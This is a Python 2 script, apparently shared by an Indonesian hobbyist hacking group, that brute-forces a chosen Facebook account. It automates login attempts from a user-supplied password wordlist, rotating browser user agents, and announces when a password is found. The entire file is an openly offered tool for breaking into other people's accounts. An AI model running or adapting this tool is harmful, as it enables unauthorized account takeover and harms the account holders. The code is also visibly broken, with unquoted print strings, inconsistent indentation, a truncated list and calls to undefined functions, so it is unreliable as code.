#Author : B4ng Sanz
#Note   : Bocah SMP Berkarya
#Team   : CYB3R TEAM
#Sorry bro,gw mah gini orangnya!!
#Bukannya gx berani cuman ada cara buat ngejatuhin tanpa otot tapi dgn otak.. 

import sys
import mechanize
import cookielib
import random
import time

def Sanz(s):
        for c in s + '\n':
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Red light
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Red
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    """
	time.sleep(3)	
	print(G+"____  _  _                 ____")
	print(G+| __ )| || |  _ __   __ _  / ___|  __ _ _ __  ____")
	print(R+|  _ \| || |_| '_ \ / _` | \___ \ / _` | '_ \|_  /")
	print(R+| |_) |__   _| | | | (_| |  ___) | (_| | | | |/ / ")
	print(G+|____/   |_| |_| |_|\__, | |____/ \__,_|_| |_/___|")
    print(G+                    |___/")
	   			   \033[96;4mBocah SMP Berkarya\033[92;1m	  
	
cover ()

email = str(raw_input(G+" [+]>Masukkan ID Target\033[31cm: "))

password = str (raw_input (G+" [+]>Tulis pass.txt\032 [31cm: "))

#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'

login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.$


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek(RR+"  Wordlist tidak ada yang cocok cuy")
        runntek(RR+"  Kembangin Wordlistnya Sendiri Cuy")
        time.sleep(1)
        print WW+34*"  -"
        kol()
        
def kol():
    nok = raw_input("Edit wordlist cuy.? \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Silahkan tulis perintah \033[92;1m[ nano pass.txt ] !")
        print WW+(41*"-")
        print GL+(" ")
        os.sys.exit()
    else:
        exit(0)
def brute(password):
        sys.stdout.write(GG+"\r[+]\033[97;1m Cracking Cuy....{}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Password Find \033[31;1m===| \033[96;1m{}".format(password))
                        print " "
                        raw_input(WW+"TEKAN ENTER UNTUK KELUAR.....")
                        sys.exit(1)


def search():
        global password
        passwords = open(password,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)

   print wel
   print " "
   total = open(password,"r")
   total = total.readlines()
   print " "
   print G+" [•] Account to crack : {}".format(email)
   print R+" [•] Jumlah :" , len(total),WW+ "passwords"
   print Y+" [•] Cracking, please wait .....\n\n"
   
   if __name__ == '__main__':
   main()
